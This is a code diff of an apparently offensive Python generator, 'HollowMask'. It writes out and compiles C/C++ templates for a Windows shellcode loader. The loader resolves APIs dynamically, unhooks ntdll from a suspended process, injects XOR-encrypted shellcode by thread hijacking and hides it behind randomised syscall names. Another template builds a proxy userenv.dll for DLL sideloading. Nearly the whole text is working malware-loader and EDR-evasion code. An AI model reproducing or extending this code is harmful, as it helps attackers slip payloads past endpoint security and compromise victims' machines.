-    CreateFileA_t CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
-    GetFileSize_t GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
-    ReadFile_t ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
-    GetThreadContext_t GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
-    SetThreadContext_t SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
-    Sleep_t SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
-    ResumeThread_t ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);
-
-    //Nt Functions
-    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
-    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
-    NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
-    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
-    NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
-    NtReadVirtualMemory_t NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);
-
-    //msvcrt Function
-    wprintf_t wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);
-
+    // Function names
+	NTSTATUS status = NULL;
+    LoadFunctionBeforeUnhooking();
+   
     // ntdll unhooking
     STARTUPINFO siSuspended;
     PROCESS_INFORMATION piSuspended;
@@ -904,7 +792,9 @@ extern "C" void exec() {
     WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\\n', 0x00 };
     wprintfFunc(finishedReplace);
 
-    // Process Hollowing
+    LoadFunctionsAfterUnhooking();
+
+    // Thread Hijacking
     HANDLE hFile = CreateFileAFunc(
         "OUTPUT_PLACEHOLDER", // change it to the file name of the encrypted shellcode
         GENERIC_READ | GENERIC_WRITE,
@@ -1095,112 +985,143 @@ BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 function_h = """#include <windows.h>
 
 // kernel32 function
-typedef HMODULE(WINAPI* LoadLibraryA_t)(
-    LPCSTR ModuleName
-);
+typedef HMODULE(WINAPI* LOADLIBRARYA)(
+	LPCSTR ModuleName
+	);
 
 typedef BOOL(WINAPI* CreateProcessA_t) (
-    LPCSTR                lpApplicationName,
-    LPSTR                 lpCommandLine,
-    LPSECURITY_ATTRIBUTES lpProcessAttributes,
-    LPSECURITY_ATTRIBUTES lpThreadAttributes,
-    BOOL                  bInheritHandles,
-    DWORD                 dwCreationFlags,
-    LPVOID                lpEnvironment,
-    LPCSTR                lpCurrentDirectory,
-    LPSTARTUPINFOA        lpStartupInfo,
-    LPPROCESS_INFORMATION lpProcessInformation
-);
+	LPCSTR                lpApplicationName,
+	LPSTR                 lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL                  bInheritHandles,
+	DWORD                 dwCreationFlags,
+	LPVOID                lpEnvironment,
+	LPCSTR                lpCurrentDirectory,
+	LPSTARTUPINFOA        lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+	);
 
 typedef BOOL(WINAPI* TerminateProcess_t)(
-    HANDLE hProcess,
-    UINT uExitCode
-);
+	HANDLE hProcess,
+	UINT uExitCode
+	);
 
 typedef BOOL(WINAPI* CloseHandle_t)(
-  HANDLE hObject
-);
+	HANDLE hObject
+	);
 
 typedef HANDLE(WINAPI* CreateFileA_t)(
-  LPCSTR                lpFileName,
-  DWORD                 dwDesiredAccess,
-  DWORD                 dwShareMode,
-  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-  DWORD                 dwCreationDisposition,
-  DWORD                 dwFlagsAndAttributes,
-  HANDLE                hTemplateFile
-);
+	LPCSTR                lpFileName,
+	DWORD                 dwDesiredAccess,
+	DWORD                 dwShareMode,
+	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+	DWORD                 dwCreationDisposition,
+	DWORD                 dwFlagsAndAttributes,
+	HANDLE                hTemplateFile
+	);
 
 typedef DWORD(WINAPI* GetFileSize_t)(
-  HANDLE  hFile,
-  LPDWORD lpFileSizeHigh
-);
+	HANDLE  hFile,
+	LPDWORD lpFileSizeHigh
+	);
 
 typedef BOOL(WINAPI* ReadFile_t)(
-  HANDLE       hFile,
-  LPVOID       lpBuffer,
-  DWORD        nNumberOfBytesToRead,
-  LPDWORD      lpNumberOfBytesRead,
-  LPOVERLAPPED lpOverlapped
-);
+	HANDLE       hFile,
+	LPVOID       lpBuffer,
+	DWORD        nNumberOfBytesToRead,
+	LPDWORD      lpNumberOfBytesRead,
+	LPOVERLAPPED lpOverlapped
+	);
 
 typedef BOOL(WINAPI* GetThreadContext_t)(
-  HANDLE    hThread,
-  LPCONTEXT lpContext
-);
+	HANDLE    hThread,
+	LPCONTEXT lpContext
+	);
 
 typedef BOOL(WINAPI* SetThreadContext_t)(
-  HANDLE        hThread,
-  const CONTEXT *lpContext
-);
+	HANDLE        hThread,
+	const CONTEXT* lpContext
+	);
 
 typedef DWORD(WINAPI* ResumeThread_t)(
-  HANDLE hThread
-);
+	HANDLE hThread
+	);
 
 typedef void(WINAPI* Sleep_t)(
-  DWORD dwMilliseconds
-);
+	DWORD dwMilliseconds
+	);
 
 //ntdll function
 typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-);
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	ULONG_PTR ZeroBits,
+	PSIZE_T RegionSize,
+	ULONG AllocationType,
+	ULONG Protect
+	);
 
 typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    PULONG NumberOfBytesToProtect,
-    ULONG NewAccessProtection,
-    PULONG OldAccessProtection
-);
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	PULONG NumberOfBytesToProtect,
+	ULONG NewAccessProtection,
+	PULONG OldAccessProtection
+	);
 
 typedef NTSTATUS(NTAPI* NtWriteVirtualMemroy_t)(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T NumberOfBytesToWrite,
-    PSIZE_T NumberOfBytesWritten
-);
+	HANDLE ProcessHandle,
+	PVOID BaseAddress,
+	PVOID Buffer,
+	SIZE_T NumberOfBytesToWrite,
+	PSIZE_T NumberOfBytesWritten
+	);
 
 typedef NTSTATUS(WINAPI* NtReadVirtualMemory_t)(
-    HANDLE               ProcessHandle,
-    PVOID                BaseAddress,
-    PVOID               Buffer,
-    ULONG                NumberOfBytesToRead,
-    PULONG              NumberOfBytesReaded
-);
+	HANDLE               ProcessHandle,
+	PVOID                BaseAddress,
+	PVOID               Buffer,
+	ULONG                NumberOfBytesToRead,
+	PULONG              NumberOfBytesReaded
+	);
 
 // msvcrt functions
 typedef int(WINAPI* wprintf_t)(
-    const wchar_t* format,
-    ...
-);
+	const wchar_t* format,
+	...
+	);
+
+extern  UINT64 kernel32dll;
+extern  HMODULE ntdlldll;
+
+extern  CreateProcessA_t CreateProcessAFunc;
+extern  TerminateProcess_t TerminateProcessFunc;
+extern  CloseHandle_t CloseHandleFunc;
+extern  CreateFileA_t CreateFileAFunc;
+extern  GetFileSize_t GetFileSizeFunc;
+extern  ReadFile_t ReadFileFunc;
+extern  GetThreadContext_t GetThreadContextFunc;
+extern  SetThreadContext_t SetThreadContextFunc;
+extern  Sleep_t SleepFunc;
+extern  ResumeThread_t ResumeThreadFunc;
+extern  LOADLIBRARYA LoadLibraryAFunc;
+
+extern  NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc;
+extern  NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc;
+extern  NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc;
+extern  NtReadVirtualMemory_t NtReadVirtualMemoryFunc;
+
+extern  wprintf_t wprintfFunc;
+
+void LoadFunctionBeforeUnhooking();
+void LoadFunctionsAfterUnhooking();
+PVOID GetDll(PWSTR FindName);
+char* strstrFunc(const char* string, const char* substring);
+PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length);
+void sleep();
+void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len);
+int my_strcmp(const char* p1, const char* p2);
 """
 
 addressHunter = """#include <windows.h>
@@ -1556,6 +1477,7 @@ def main():
     global template_dll
     global function_h
     global addressHunter
+    global functions_cpp_template
     
     logo = """  _   _       _ _               __  __           _    
     | | | | ___ | | | _____      _|  \/  | __ _ ___| | __
@@ -1595,9 +1517,6 @@ def main():
     else:
         args.process = f"c:\\\\windows\\\\system32\\\\{args.process}"
         
-    
-
-    
     print("[+] Generating random names for syscalls!")
     syscalls = [
         "LoadLibraryA",
@@ -1635,29 +1554,40 @@ def main():
                 print(f"\t[!] syscall {syscalls[i]} = {new_syscalls[i]}")
                 template = template.replace(syscalls[i], new_syscalls[i])
                 function_h = function_h.replace(syscalls[i], new_syscalls[i])
+                functions_cpp_template = functions_cpp_template.replace(syscalls[i], new_syscalls[i])
 
             template = template.replace("GetSymbolAddress", get_symbol_address)
+            functions_cpp_template = functions_cpp_template.replace("GetSymbolAddress", get_symbol_address)
             addressHunter = addressHunter.replace("GetSymbolAddress", get_symbol_address)
 
             template = template.replace("GetKernel32", GetKernel32)
+            functions_cpp_template = functions_cpp_template.replace("GetKernel32", GetKernel32)
             addressHunter = addressHunter.replace("GetKernel32", GetKernel32)
 
+            functions_cpp_template = functions_cpp_template.replace("CopyMemoryEx", CopyMemoryEx)
+            function_h = function_h.replace("CopyMemoryEx", CopyMemoryEx)
             template = template.replace("CopyMemoryEx", CopyMemoryEx)
             template = template.replace("XOR_KEY_PLACEHOLDER", random_xor_key)
             template = template.replace("OUTPUT_PLACEHOLDER", args.out)
             template = template.replace("PROCESS_INJECT_PLACEHOLDER", args.process)
+
         else:
             for i in range(len(new_syscalls)):
                 print(f"\t[!] syscall {syscalls[i]} = {new_syscalls[i]}")
                 template_dll = template_dll.replace(syscalls[i], new_syscalls[i])
                 function_h = function_h.replace(syscalls[i], new_syscalls[i])
+                functions_cpp_template = functions_cpp_template.replace(syscalls[i], new_syscalls[i])
 
             template_dll = template_dll.replace("GetSymbolAddress", get_symbol_address)
+            functions_cpp_template = functions_cpp_template.replace("GetSymbolAddress", get_symbol_address)
             addressHunter = addressHunter.replace("GetSymbolAddress", get_symbol_address)
 
             template_dll = template_dll.replace("GetKernel32", GetKernel32)
+            functions_cpp_template = functions_cpp_template.replace("GetKernel32", GetKernel32)
             addressHunter = addressHunter.replace("GetKernel32", GetKernel32)
 
+            functions_cpp_template = functions_cpp_template.replace("CopyMemoryEx", CopyMemoryEx)
+            function_h = function_h.replace("CopyMemoryEx", CopyMemoryEx)
             template_dll = template_dll.replace("CopyMemoryEx", CopyMemoryEx)
             template_dll = template_dll.replace("XOR_KEY_PLACEHOLDER", random_xor_key)
             template_dll = template_dll.replace("OUTPUT_PLACEHOLDER", args.out)
@@ -1668,6 +1598,7 @@ def main():
             os.makedirs("obfuscated")
         else:
             os.system("rm -rf obfuscated/*")
+            
 
         if not args.isDLL:
             with open("./obfuscated/main.cpp", "w") as h:
@@ -1679,9 +1610,13 @@ def main():
         else:
             with open("./obfuscated/dllmain.cpp", "w") as h:
                 h.write(template_dll)
+
             with open("./obfuscated/proxy.def", "w") as h:
                 h.write(proxy_def)
 
+
+        with open("./obfuscated/functions.cpp", "w") as h:
+                h.write(functions_cpp_template)
 
         with open("./obfuscated/functions.h", "w") as h:
             h.write(function_h)
@@ -1695,12 +1630,14 @@ def main():
         if not args.isDLL:
             os.system("nasm -f win64 adjuststack.asm -o adjuststack.o > /dev/null 2>&1")
             os.system("x86_64-w64-mingw32-gcc main.cpp -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o template.o -Wl,-Tlinker.ld,--no-seh > /dev/null 2>&1")
-            os.system("x86_64-w64-mingw32-ld -s adjuststack.o template.o -o HollowMask.exe > /dev/null 2>&1")
+            os.system("x86_64-w64-mingw32-gcc functions.cpp -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o functions.o -Wl,-Tlinker.ld,--no-seh > /dev/null 2>&1")
+            os.system("x86_64-w64-mingw32-ld -s adjuststack.o template.o functions.o -o HollowMask.exe > /dev/null 2>&1")
             os.system("rm *.o")
         else:
 
             os.system("x86_64-w64-mingw32-gcc -m64 -c -Os dllmain.cpp -Wall -shared -masm=intel -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -Wl,--no-seh > /dev/null 2>&1")
-            os.system("x86_64-w64-mingw32-dllwrap -m64 --def proxy.def dllmain.o -o userenv.dll > /dev/null 2>&1")
+            os.system("x86_64-w64-mingw32-gcc functions.cpp -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o functions.o -Wl,-Tlinker.ld,--no-seh > /dev/null 2>&1")
+            os.system("x86_64-w64-mingw32-dllwrap -m64 --def proxy.def dllmain.o functions.o -o userenv.dll > /dev/null 2>&1")
             os.system("rm *.o")
 
     
